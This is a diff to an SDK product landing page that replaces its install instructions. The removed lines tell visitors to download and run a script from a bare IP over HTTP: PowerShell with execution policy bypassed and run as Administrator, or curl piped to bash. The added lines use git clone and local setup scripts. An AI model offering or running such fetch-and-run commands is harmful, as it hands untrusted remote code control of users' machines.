@@ -155,12 +155,8 @@ footer .footer-links{display:flex;justify-content:center;gap:1.5rem;margin-botto
     <a class="btn btn-secondary" href="#api">API Reference</a>
   </div>
   <div class="install-strip">
-    <div class="install-tabs">
-      <button class="install-tab active" onclick="setOs('win',this)">Windows</button>
-      <button class="install-tab" onclick="setOs('mac',this)">macOS / Linux</button>
-    </div>
     <div class="install-body">
-      <code id="install-cmd">powershell -ExecutionPolicy Bypass -Command "iex (iwr -useb http://68.183.248.32/agent-demo/install.ps1)"</code>
+      <code id="install-cmd">git clone https://github.com/TommyP949/drp-compliance-sdk</code>
       <button class="copy-btn" onclick="copyInstall()">COPY</button>
     </div>
   </div>
@@ -219,19 +215,22 @@ footer .footer-links{display:flex;justify-content:center;gap:1.5rem;margin-botto
         <div class="dot" style="background:#ff5f57"></div>
         <div class="dot" style="background:#febc2e"></div>
         <div class="dot" style="background:#28c840"></div>
-        <span class="qs-card-title">Windows — PowerShell (no Node.js required)</span>
+        <span class="qs-card-title">Windows</span>
       </div>
-      <pre><span class="c"># Run as Administrator for best results</span>
-powershell -ExecutionPolicy Bypass -Command <span class="s">"iex (iwr -useb http://68.183.248.32/agent-demo/install.ps1)"</span></pre>
+      <pre>git clone https://github.com/TommyP949/drp-compliance-sdk
+cd drp-compliance-sdk
+powershell -ExecutionPolicy Bypass -File setup.ps1</pre>
     </div>
     <div class="qs-card">
       <div class="qs-card-head">
         <div class="dot" style="background:#ff5f57"></div>
         <div class="dot" style="background:#febc2e"></div>
         <div class="dot" style="background:#28c840"></div>
-        <span class="qs-card-title">macOS / Linux — bash</span>
+        <span class="qs-card-title">macOS / Linux</span>
       </div>
-      <pre>curl -fsSL http://68.183.248.32/agent-demo/install.sh | bash</pre>
+      <pre>git clone https://github.com/TommyP949/drp-compliance-sdk
+cd drp-compliance-sdk
+bash setup.sh</pre>
     </div>
   </div>
 
